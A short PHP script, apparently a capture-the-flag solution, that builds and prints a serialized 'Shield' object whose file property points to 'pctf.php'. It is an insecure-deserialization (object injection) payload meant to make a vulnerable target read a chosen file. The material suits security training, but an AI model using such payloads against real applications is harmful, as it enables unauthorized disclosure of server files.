<?php

class Shield {
    public $file;
}

$data = new Shield();
$data->file = "pctf.php";

echo (serialize($data)) . "\n";